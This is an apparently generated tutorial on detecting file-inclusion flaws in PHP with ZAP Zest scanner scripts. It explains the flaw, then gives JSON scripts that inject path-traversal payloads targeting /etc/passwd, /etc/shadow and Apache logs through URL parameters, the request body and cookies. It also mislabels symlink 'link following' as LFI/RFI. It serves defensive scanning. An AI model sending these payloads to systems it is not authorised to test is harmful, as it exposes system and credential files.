# Improper Link Resolution Before File Access ('Link Following') (CWE-059) in PHP

###### Understanding Improper Link Resolution Before File Access ('Link Following') in PHP Web Applications

**Improper Link Resolution Before File Access ('Link Following')** is a vulnerability that arises when a web application improperly resolves file paths before accessing them. This can lead to various security risks such as Local File Inclusion (LFI) or Remote File Inclusion (RFI) attacks.

In PHP applications, this vulnerability often manifests when user inputs are directly used in file path constructions without proper validation or filtering. Common injection points include URL parameters, HTTP request bodies, HTTP headers, cookies, and query strings.

**Common Variations:**
1. **Local File Inclusion (LFI):** An attacker includes files from the local filesystem.
2. **Remote File Inclusion (RFI):** An attacker includes files from a remote server.

### Designing ZAP Zest Scripts to Detect Link Following Vulnerabilities

#### Components of Zest Scripts

**Actions:**
1. **ZestRequest:** To simulate the attack by crafting HTTP requests.
2. **ZestAction:** Used to perform additional operations based on the responses (e.g., logging failures).

**Assertions:**
1. **ZestAssertion:** To validate conditions like status codes and response contents.
2. **ZestExpression:** Logical expressions to fine-tune the control flow.

**Typical HTTP Response Indicators:**
1. **HTTP Status Codes:** 200 for successful file inclusion, 500 for server errors, 403 for forbidden access.
2. **Response Content:** Presence of keywords like "root:" or "<?php" indicating inclusion of sensitive files.

### Example Zest Script: Detecting LFI via URL Parameter

```json
{
  "about": "LFI detection script for PHP applications",
  "zestVersion": "0.8",
  "title": "LFI Detection via URL Parameter",
  "description": "This script detects Local File Inclusion (LFI) vulnerabilities by injecting common file paths into URL parameters.",
  "statements": [
    {
      "url": "http://{{target}}/vulnerable.php?file=../../../../etc/passwd",
      "method": "GET",
      "response": { "statusCode": 200 },
      "assertions": [
        {
          "rootExpression": {
            "regex": "root:.*:0:0:.*",
            "location": "BODY",
            "elementType": "ZestExpressionRegex"
          },
          "elementType": "ZestAssertion"
        }
      ],
      "elementType": "ZestRequest"
    },
    {
      "index": 2,
      "message": "Potential LFI vulnerability detected!",
      "elementType": "ZestActionFail"
    }
  ],
  "elementType": "ZestScript"
}
```

### Explanation:

1. **ZestRequest:**
   - **URL:** Attempts to include the `/etc/passwd` file through a vulnerable parameter.
   - **Method:** GET
   - **Assertions:** Checks if the response body contains the string "root:" which indicates a successful inclusion of Unix password file.

2. **ZestActionFail:**
   - **Message:** Outputs a failure message if the assertion passes, meaning a potential LFI vulnerability is detected.

### Script Variations for Different Injection Points

#### URL Parameter

For URL parameters, repeat the above script with different common injection strings:
```json
"file=../../../../etc/shadow"
"file=../../../../var/log/apache2/access.log"
```

#### HTTP Request Body

```json
{
  "url": "http://{{target}}/vulnerable.php",
  "method": "POST",
  "data": "file=../../../../etc/passwd",
  "headers": "Content-Type: application/x-www-form-urlencoded",
  "response": { "statusCode": 200 },
  "assertions": [
    {
      "rootExpression": {
        "regex": "root:.*:0:0:.*",
        "location": "BODY",
        "elementType": "ZestExpressionRegex"
      },
      "elementType": "ZestAssertion"
    }
  ],
  "elementType": "ZestRequest"
}
```

#### Cookie

```json
{
  "url": "http://{{target}}/vulnerable.php",
  "method": "GET",
  "headers": "Cookie: file=../../../../etc/passwd",
  "response": { "statusCode": 200 },
  "assertions": [
    {
      "rootExpression": {
        "regex": "root:.*:0:0:.*",
        "location": "BODY",
        "elementType": "ZestExpressionRegex"
      },
      "elementType": "ZestAssertion"
    }
  ],
  "elementType": "ZestRequest"
}
```

### Conclusion

By carefully constructing Zest scripts to test different injection points and response indicators, you can effectively detect Improper Link Resolution vulnerabilities with minimal false positives and negatives. Ensure that each script validates multiple scenarios and response conditions to cover the broad range of potential exploits.
